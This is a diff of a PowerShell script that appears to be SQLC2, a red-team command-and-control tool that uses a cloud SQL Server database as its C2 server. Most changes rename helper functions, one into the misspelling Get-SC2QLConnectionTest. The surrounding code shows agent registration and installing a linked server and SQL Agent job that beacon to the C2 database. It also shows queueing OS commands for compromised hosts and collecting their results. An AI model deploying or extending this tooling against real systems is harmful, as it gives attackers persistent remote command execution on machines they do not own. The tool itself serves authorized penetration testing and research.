@@ -18,7 +18,7 @@
 
 	    3. Create a SQL server databse. In this example the server will be named sqlcloudc2 and the datatabase will be named database1.
 
-	    4. Add a virtual firewall exception for the target networks that you will be receiving connections from. Traffic will come inbound over port 1433.
+	    4. Add a virtual firewall exception for the target networks that you will be receiving connections from.
 
 	    ----------------------------
 	    Attack Workflow Overview
@@ -80,10 +80,10 @@
 
 
 # ----------------------------------
-#  Get-SQLConnectionObject
+#  Get-C2SQLConnectionObject
 # ----------------------------------
 # Author: Scott Sutherland
-Function Get-SQLConnectionObject
+Function Get-C2SQLConnectionObject
 {
     <#
             .SYNOPSIS
@@ -103,7 +103,7 @@ Function Get-SQLConnectionObject
             .PARAMETER TrustServerCert
             Trust the certificate of the remote server.
             .EXAMPLE
-            PS C:\> Get-SQLConnectionObject -Username myuser -Password mypass -Instance server1 -Encrypt Yes -TrustServerCert Yes -AppName "myapp"
+            PS C:\> Get-C2SQLConnectionObject -Username myuser -Password mypass -Instance server1 -Encrypt Yes -TrustServerCert Yes -AppName "myapp"
             StatisticsEnabled                : False
             AccessToken                      : 
             ConnectionString                 : Server=server1;Database=Master;User ID=myuser;Password=mypass;Connection Timeout=1 ;Application 
@@ -258,10 +258,10 @@ Function Get-SQLConnectionObject
 
 
 # ----------------------------------
-#  Get-SQLQuery
+#  Get-C2SQLQuery
 # ----------------------------------
 # Author: Scott Sutherland
-Function Get-SQLQuery
+Function Get-C2SQLQuery
 {
     <#
             .SYNOPSIS
@@ -293,11 +293,11 @@ Function Get-SQLQuery
             .PARAMETER TrustServerCert
             Trust the certificate of the remote server.
             .EXAMPLE
-            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
+            PS C:\> Get-C2SQLQuery -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
             .EXAMPLE
-            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
+            PS C:\> Get-C2SQLQuery -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLQuery -Verbose -Query "Select @@version" -Threads 15
+            PS C:\> Get-SQLInstanceDomain | Get-C2SQLQuery -Verbose -Query "Select @@version" -Threads 15
     #>
     [CmdletBinding()]
     Param(
@@ -373,12 +373,12 @@ Function Get-SQLQuery
         if($DAC)
         {
             # Create connection object
-            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database -AppName $AppName -Encrypt $Encrypt -TrustServerCert $TrustServerCert
+            $Connection = Get-C2SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database -AppName $AppName -Encrypt $Encrypt -TrustServerCert $TrustServerCert
         }
         else
         {
             # Create connection object
-            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database -AppName $AppName -Encrypt $Encrypt -TrustServerCert $TrustServerCert
+            $Connection = Get-C2SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database -AppName $AppName -Encrypt $Encrypt -TrustServerCert $TrustServerCert
         }
 
         # Parse SQL Server instance name
@@ -416,7 +416,7 @@ Function Get-SQLQuery
             }
             catch
             {
-                # Connection failed - for detail error use  Get-SQLConnectionTest
+                # Connection failed - for detail error use  Get-SC2QLConnectionTest
                 if(-not $SuppressVerbose)
                 {
                     Write-Verbose -Message "$Instance : Connection Failed."
@@ -431,7 +431,7 @@ Function Get-SQLQuery
         }
         else
         {
-            Write-Output -InputObject 'No query provided to Get-SQLQuery function.'
+            Write-Output -InputObject 'No query provided to Get-C2SQLQuery function.'
             Break
         }
     }
@@ -452,9 +452,9 @@ Function Get-SQLQuery
 
 
 # ----------------------------------
-#  Get-SQLConnectionTest
+#  Get-SC2QLConnectionTest
 # ----------------------------------
-Function Get-SQLConnectionTest
+Function Get-SC2QLConnectionTest
 {
     <#
             .SYNOPSIS
@@ -476,11 +476,11 @@ Function Get-SQLConnectionTest
             .PARAMETER SuppressVerbose
             Suppress verbose errors.  Used when function is wrapped.
             .EXAMPLE
-            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress"
+            PS C:\> Get-SC2QLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress"
             .EXAMPLE
-            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
+            PS C:\> Get-SC2QLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose
+            PS C:\> Get-SQLInstanceDomain | Get-SC2QLConnectionTest -Verbose
     #>
     [CmdletBinding()]
     Param(
@@ -532,7 +532,7 @@ Function Get-SQLConnectionTest
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -544,12 +544,12 @@ Function Get-SQLConnectionTest
         if($DAC)
         {
             # Create connection object
-            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
+            $Connection = Get-C2SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
         }
         else
         {
             # Create connection object
-            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
+            $Connection = Get-C2SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
         }
 
         # Attempt connection
@@ -596,10 +596,10 @@ Function Get-SQLConnectionTest
 
 
 # -------------------------------------------
-# Function: Get-ComputerNameFromInstance
+# Function: Get-C2ComputerNameFromInstance
 # ------------------------------------------
 # Author: Scott Sutherland
-Function Get-ComputerNameFromInstance
+Function Get-C2ComputerNameFromInstance
 {
     <#
             .SYNOPSIS
@@ -607,7 +607,7 @@ Function Get-ComputerNameFromInstance
             .PARAMETER Instance
             SQL Server instance to parse.
             .EXAMPLE
-            PS C:\> Get-ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
+            PS C:\> Get-C2ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
             SQLServer1
     #>
     [CmdletBinding()]
@@ -711,7 +711,7 @@ Function Install-SQLC2Server
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -720,7 +720,7 @@ Function Install-SQLC2Server
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
 
@@ -752,7 +752,7 @@ Function Install-SQLC2Server
 	            SELECT name FROM master..sysdatabases WHERE name like '$Database'"
         
         # Create Database results
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database 'master' -SuppressVerbose -TimeOut 300 
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database 'master' -SuppressVerbose -TimeOut 300 
         $RowCount = $TblResults | Measure-Object | select Count -ExpandProperty count        
         if($RowCount -eq 1)
         {
@@ -787,7 +787,7 @@ Function Install-SQLC2Server
                 );SELECT name FROM sys.tables WHERE name = 'C2COMMANDS'"
         
         # Create Database results
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database "$Database" -SuppressVerbose
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database "$Database" -SuppressVerbose
         $RowCount = $TblResults | Measure-Object | select Count -ExpandProperty count    
         if($RowCount -eq 1)
         {
@@ -892,7 +892,7 @@ Function Install-SQLC2AgentLink
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -901,7 +901,7 @@ Function Install-SQLC2AgentLink
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
 
@@ -966,7 +966,7 @@ Function Install-SQLC2AgentLink
         
         # Run Query
         Write-Verbose "$instance : Creating server link named '$RandomLink' as $C2Username to $C2Instance "
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -TimeOut 300 
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -TimeOut 300 
 
         # Verify link addition
         if(($TblResults | Select Column1 -ExpandProperty Column1) -eq 1)
@@ -1115,7 +1115,7 @@ Function Install-SQLC2AgentLink
             ORDER BY JOB_OWNER,JOB_NAME"
         
         # Run Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database 'msdb' -SuppressVerbose -TimeOut 300
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database 'msdb' -SuppressVerbose -TimeOut 300
 
         # Verify job was added
         if(($TblResults | Measure-Object | select count -ExpandProperty count) -eq 1)
@@ -1209,7 +1209,7 @@ Function Register-SQLC2Agent
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -1218,7 +1218,7 @@ Function Register-SQLC2Agent
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
         if($TestConnection)
@@ -1247,7 +1247,7 @@ Function Register-SQLC2Agent
             WHERE servername like '$env:COMPUTERNAME'"
 
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose
 
         Write-Verbose "$instance : $env:COMPUTERNAME agent registered/checked in."
     }
@@ -1327,7 +1327,7 @@ Function Get-SQLC2Agent
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -1336,7 +1336,7 @@ Function Get-SQLC2Agent
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
         if($TestConnection)
@@ -1359,7 +1359,7 @@ Function Get-SQLC2Agent
         $Query = "SELECT * FROM dbo.c2agents"
 
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose        
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose        
         $AgentCount = $TblResults | measure | select count -ExpandProperty count
 
         Write-Verbose -Message "$Instance : $AgentCount agents were found registered."
@@ -1457,7 +1457,7 @@ Function Set-SQLC2Command
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -1466,7 +1466,7 @@ Function Set-SQLC2Command
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
 
@@ -1498,7 +1498,7 @@ Function Set-SQLC2Command
         $Query = "INSERT dbo.C2COMMANDS (ServerName,Command,Status) VALUES ('$ServerName','$Command','pending')"
 
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose
 
         Write-Verbose "$instance : Command added for $ServerName agent(s) on C2 server $Instance."
     }
@@ -1587,7 +1587,7 @@ Function Get-SQLC2Command
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -1596,7 +1596,7 @@ Function Get-SQLC2Command
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
         if($TestConnection)
@@ -1623,7 +1623,7 @@ Function Get-SQLC2Command
         $Query = "SELECT * FROM dbo.c2commands where status like 'pending' and (servername like '$env:COMPUTERNAME' or servername like 'All')"
 
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
 
         # check command count
         $CommandCount = $TblResults | measure | select count -ExpandProperty count
@@ -1644,7 +1644,7 @@ Function Get-SQLC2Command
                $C2Command = $_.command
                
                # Execute command                             
-               Create-SQLC2Command -Username $Username -Password $Password -Instance $Instance -Database $Database -Verbose -Command $C2Command -Cid $C2CommandId
+               Invoke-SQLC2Command -Username $Username -Password $Password -Instance $Instance -Database $Database -Verbose -Command $C2Command -Cid $C2CommandId
             }
         }else{
 
@@ -1656,10 +1656,10 @@ Function Get-SQLC2Command
 
 
 # ----------------------------------
-#  Create-SQLC2Command
+#  Invoke-SQLC2Command
 # ----------------------------------
 # Author: Scott Sutherland
-Function Create-SQLC2Command
+Function Invoke-SQLC2Command
 {
     <#
             .SYNOPSIS
@@ -1678,8 +1678,8 @@ Function Create-SQLC2Command
             .PARAMETER Command
             The OS command to run.
             .EXAMPLE
-            PS C:\> Create-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
-            PS C:\> Create-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
+            PS C:\> Invoke-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
+            PS C:\> Invoke-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
     #>
     [CmdletBinding()]
     Param(
@@ -1746,7 +1746,7 @@ Function Create-SQLC2Command
         }                         
 
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -1755,7 +1755,7 @@ Function Create-SQLC2Command
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
         if($TestConnection)
@@ -1785,7 +1785,7 @@ Function Create-SQLC2Command
             WHERE CID like $Cid"
 
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
 
         # check command count
         $CommandCount = $TblResults.row.count 
@@ -1914,7 +1914,7 @@ Function Get-SQLC2Result
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -1923,7 +1923,7 @@ Function Get-SQLC2Result
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
         if($TestConnection)
@@ -1952,7 +1952,7 @@ Function Get-SQLC2Result
             "
             $Query
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
 
         # check command count
         $CommandCount = $TblResults.row.count 
@@ -2050,7 +2050,7 @@ Function Remove-SQLC2Command
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -2059,7 +2059,7 @@ Function Remove-SQLC2Command
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
         if($TestConnection)
@@ -2084,7 +2084,7 @@ Function Remove-SQLC2Command
                   $ServerFilter"
 
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
     }
 
     End
@@ -2174,7 +2174,7 @@ Function Remove-SQLC2Agent
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -2183,7 +2183,7 @@ Function Remove-SQLC2Agent
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
         if($TestConnection)
@@ -2208,7 +2208,7 @@ Function Remove-SQLC2Agent
                   $ServerFilter"
 
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
     }
 
     End
@@ -2216,8 +2216,6 @@ Function Remove-SQLC2Agent
         Write-Verbose "$instance : Done."
     }
  }
-
-
 
 
 # ----------------------------------
@@ -2281,7 +2279,7 @@ Function Uninstall-SQLC2AgentLink
     Process
     {
         # Parse computer name from the instance
-        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance
 
         # Default connection to local default instance
         if(-not $Instance)
@@ -2290,7 +2288,7 @@ Function Uninstall-SQLC2AgentLink
         }
 
         # Test connection to instance
-        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
         }
         if($TestConnection)
@@ -2325,7 +2323,7 @@ Function Uninstall-SQLC2AgentLink
 	                select 'The agent job does not exist.'"
 
         # Execute Query
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
     }
 
     End
